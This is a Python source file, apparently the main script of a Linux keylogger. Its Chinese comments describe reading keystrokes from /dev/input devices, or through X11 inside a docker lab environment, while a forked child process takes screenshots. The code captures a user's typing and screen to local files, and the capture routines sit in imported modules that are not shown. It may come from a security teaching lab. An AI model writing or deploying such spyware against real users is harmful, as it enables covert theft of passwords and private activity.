# coding: utf-8
import sys
import os

from keylogger.keyboard import linux_thread_func
from keylogger.keylogger import virtual_thread_func
from screenshot import screen_shot


def keylogger_func(file_name, file_type):
    """
    根据当前系统环境判断从哪里获取输入设备：
        1. 在docker实验环境中， 没有物理输入设备，通过使用x11来记录
        2. 在实际的linux物理机和vmware, virtualbox的虚拟机下，我们通过/dev/input下的输入设备
           来记录用户的键盘操作
    """
    if "linux" not in sys.platform:
        print u"该程序只能在linux下运行，windows和macos暂不支持"
        sys.exit(-1)
    if not os.path.exists("/dev/input/"):
        virtual_thread_func(file_name, file_type)
    else:
        linux_thread_func(file_name, file_type)


def main(key_name, pic_name, key_type='txt', pic_type='png'):
    """
       因为捕捉键盘记录 和屏幕截图 是两个独立的任务，
       所以在这里fork产生一个新的进程来执行屏幕截图
    """
    f = os.fork()
    if f == 0:
        # 这里是子进程, 会调用外部程序
        screen_shot(pic_name, pic_type)
    else:
        # 父进程
        keylogger_func(key_name, key_type)


if __name__ == '__main__':
    main("key", "shot")
